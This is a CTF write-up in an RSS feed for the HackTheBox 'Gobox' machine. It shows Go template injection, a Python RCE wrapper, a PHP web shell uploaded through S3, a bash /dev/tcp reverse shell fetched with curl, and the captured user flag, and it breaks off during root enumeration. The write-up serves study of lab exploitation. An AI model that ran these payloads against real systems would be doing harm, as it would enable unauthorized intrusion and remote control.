<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Code-review on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/code-review/</link>
    <description>Recent content in Code-review on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/code-review/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Gobox</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</guid>
      <description>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container.</description>
      <content:encoded><![CDATA[<p>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container. This container can communicate with S3 bucket (using LocalStack) and has write permission on it, allowing me to drop a web shell to gain a foothold on the host system. Further enumeration on the host discovers a NGINX backdoor which can be used to escalate to root.</p>
<p>On the explore section, I&rsquo;m digging into the request routing of this machine.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SSTI in Golang</li>
<li>Source Code Analysis</li>
<li>Scripting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080 which are handled by NGINX.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ fscan 10.10.11.113 gobox
nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
Nmap scan report <span class="k">for</span> 10.10.11.113
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
8080/tcp open  http    nginx
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
<p>The site on port 80 is a kind of Hacking eSports homepage.</p>
<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
</p>
<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog uses Go).</p>
<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
</p>
<p>Nothing else to see here.</p>
<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
<p>On port 8080, it shows a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
</p>
<p>When an email and a password is submitted, it outputs nothing.</p>
<p>Poking with curl shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ curl -s -I http://10.10.11.113:8080       
HTTP/1.1 <span class="m">200</span> OK
Server: nginx
Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
Connection: keep-alive
X-Forwarded-Server: golang
</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
</p>
<p>The following is how the HTTP request and the HTTP response look like.</p>
<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="container-root">Container root</h3>
<h4 id="ssti">SSTI</h4>
<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
</code></pre></div><p>And the site is vulnerable to SSTI! It returns an email address: <code>ippsec@hacking.esports</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
</p>
<p>When <code>{{.}}</code> is submitted, it spits out all the available properties value.</p>
<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
</p>
<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
</p>
<h4 id="rce">RCE</h4>
<p>Examining the source code reveals that there is a function (around line 27) that allows code execution to the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">...</span>
</code></pre></div><p>Because it is an embedded method for <code>User</code> struct, and the struct is rendered by template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
<p>For example <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
</p>
<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
</p>
<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage the code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">import</span> <span class="nn">html</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># hacky curly braces</span>
<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>

<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>

	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
	<span class="k">try</span><span class="p">:</span>	
		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Using that wrapper, I have ability to send command from CLI to the compromised container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
&gt; id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
&gt; uname -a
Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
&gt; ls -la
total <span class="m">8692</span>
drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 .
drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 ..
-rwxr-xr-x <span class="m">1</span> root root <span class="m">8876980</span> Aug <span class="m">24</span> 19:04 main
drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 18:26 templates
</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="s3-enumeration">S3 enumeration</h4>
<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
&gt; aws 
usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
To see <span class="nb">help</span> text, you can run:

  aws <span class="nb">help</span>
  aws &lt;command&gt; <span class="nb">help</span>
  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div><p>Using enumeration skills I gained from <a href="http://localhost:1313/writeups/hackthebox/htb-bucket/">HTB Bucket</a>, I send <code>aws s3 ls</code> to see the available S3 buckets, and there is one called <code>website</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
2021-09-07 07:32:42 website
</code></pre></div><p>The bucket contains 4 files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
PRE css/
2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
2021-09-07 07:32:42     <span class="m">165551</span> header.png
2021-09-07 07:32:42          <span class="m">5</span> index.html
2021-09-07 07:32:42       <span class="m">1803</span> index.php
</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source of the homepage (port 80).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
&gt; cat /tmp/id.php
&lt;!DOCTYPE html&gt;
&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;

&lt;head&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I also have write access to that bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
&gt; aws s3 cp /tmp/iamf.php s3://website/
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</code></pre></div><p>When I visit back <code>10.10.11.113/iamf.php</code>, my file is there! And instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ..</code>, and that means the homepage is hosted in a different system.</p>
<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
</p>
<h4 id="webshell">Webshell</h4>
<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php

&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</code></pre></div><p>And my webshell is accessible on the homepage site.</p>
<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>This time the system has several Linux binary such as <code>curl</code> that I can use to get a foothold. First, I will craft my reverse shell scriptand host it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</code></pre></div><p>Now I will get my listener ready and execute the script.</p>
<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
</p>
<p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@gobox:/opt/website$
</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «gobox» «10.10.14.97»
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>

www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
www-data@gobox:/opt/website$
</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
www-data@gobox:/$ ls -lR /home/ubuntu
/home/ubuntu:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
www-data@gobox:/$ cat /home/ubuntu/user.txt
d6b916265fd4a984d17db028a3a729f0
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this on the explore section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>I immediately inspect the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>


        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>

        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>

        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>


        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>

<span class="c1"># Homepage
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>

        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>


            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># Login page
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># unknown
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>The server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566). To confirm that, I run another scan against port 4566, and nmap shows that it&rsquo;s open and it&rsquo;s forbidden because the authorization check.</p>
